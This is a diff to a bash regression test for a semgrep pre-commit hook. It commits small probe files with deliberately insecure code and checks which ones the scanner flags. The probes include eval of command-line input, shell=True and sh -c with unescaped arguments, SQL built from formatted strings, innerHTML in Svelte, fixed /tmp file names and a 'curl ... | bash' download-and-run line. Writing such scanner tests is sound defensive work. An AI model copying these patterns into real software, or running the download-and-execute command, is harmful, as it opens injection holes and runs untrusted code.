@@ -2,14 +2,16 @@
 # Regression test for scripts/semgrep-new with the real semgrep and the hook's rule
 # set (.semgrep/rules.yml), run the way the hook runs it, on a committed range: old
 # findings pass, a moved file keeps its findings, each rule family catches a
-# finding a commit adds, an uncommitted edit is not scanned, an unknown base
+# finding a commit adds (Rust, JS, Svelte, Python and shell, extensionless
+# scripts by shebang), test scripts are not scanned, an uncommitted edit is not scanned, an unknown base
 # falls back to the merge-base, and a missing semgrep fails the scan.
 set -uo pipefail
 root="$(git -C "$(dirname "$0")" rev-parse --show-toplevel)"
 sg="$root/scripts/semgrep-new"
 command -v semgrep >/dev/null || { echo "FAIL: semgrep is not installed (pipx install semgrep)"; exit 1; }
 wt="$(mktemp -d)"
-trap 'git -C "$root" worktree remove --force "$wt" >/dev/null 2>&1' EXIT
+export XDG_STATE_HOME; XDG_STATE_HOME="$(mktemp -d)"
+trap 'git -C "$root" worktree remove --force "$wt" >/dev/null 2>&1; rm -rf "$XDG_STATE_HOME"' EXIT
 git -C "$root" worktree add -q --detach "$wt" HEAD
 mkdir -p "$wt/.semgrep" && cp "$root/.semgrep/rules.yml" "$wt/.semgrep/rules.yml"
 cd "$wt" || exit 1
@@ -42,6 +44,28 @@ reset; mkdir -p scripts/probe; printf 'export function run(code) {\n  return eva
 scan; check "added eval of a value in JavaScript fails" $? 1
 reset; printf '<div>{@html body}</div>\n' >frontend/src/lib/Probe.svelte; commit svelte
 scan; check "added {@html} in Svelte fails" $? 1
+reset; printf '<script>\n  let { body } = $props();\n  let el;\n  $effect(() => { el.innerHTML = body; });\n</script>\n' >frontend/src/lib/Probe.svelte; commit svelte-script
+scan; check "added innerHTML in a Svelte script fails" $? 1
+reset; add_line "$src" 'pub fn added(c: &str) { let _ = std::process::Command::new("sh").arg("-c").arg(format!("{c} x")); }' shell
+scan; check "added sh -c of a formatted command in Rust fails" $? 1
+reset; add_line "$src" 'pub fn added(t: &str) -> sqlx::AssertSqlSafe<String> { sqlx::AssertSqlSafe(format!("SELECT * FROM {t}")) }' sql
+scan; check "added SQL from a formatted string fails" $? 1
+reset; printf 'import subprocess, sys\nsubprocess.run("ls " + sys.argv[1], shell=True)\n' >scripts/probe.py; commit py-shell
+scan; check "added shell=True of an argument in Python fails" $? 1
+reset; printf 'import shlex, subprocess, sys\nsubprocess.run("ls " + shlex.quote(sys.argv[1]), shell=True)\n' >scripts/probe.py; commit py-quoted
+scan; check "a quoted argument in a Python shell command passes" $? 0
+reset; printf '#!/usr/bin/env python3\nimport sys\nprint(eval(sys.argv[1]))\n' >scripts/probe-py; commit py-noext
+scan; check "added eval in an extensionless Python script fails" $? 1
+reset; printf '#!/usr/bin/env bash\necho x > /tmp/probe-out.txt\n' >scripts/probe-sh; commit sh-noext
+scan; check "added fixed /tmp name in an extensionless bash script fails" $? 1
+reset; printf '#!/usr/bin/env bash\nf=$(mktemp /tmp/probe.XXXXXX)\necho x >"$f"\n' >scripts/probe-sh; commit sh-mktemp
+scan; check "mktemp under /tmp passes" $? 0
+reset; printf '#!/usr/bin/env bash\ncurl -fsSL https://example.com/i.sh | bash\n' >scripts/probe.sh; commit sh-pipe
+scan; check "added download piped into bash fails" $? 1
+reset; printf 'fn t() { unsafe { f() } }\n' >crates/mike/src/stack/tests.rs; commit rs-tests-module
+scan; check "a tests.rs module is not scanned" $? 0
+reset; printf '#!/usr/bin/env bash\necho x > /tmp/probe-out.txt\n' >scripts/test-probe; commit sh-test
+scan; check "a test script is not scanned" $? 0
 reset; printf '\n' >>"$src"; commit clean
 printf '\npub fn added() { unsafe { libc::umask(0); } }\n' >>"$src"
 scan; check "an uncommitted edit is not scanned" $? 0
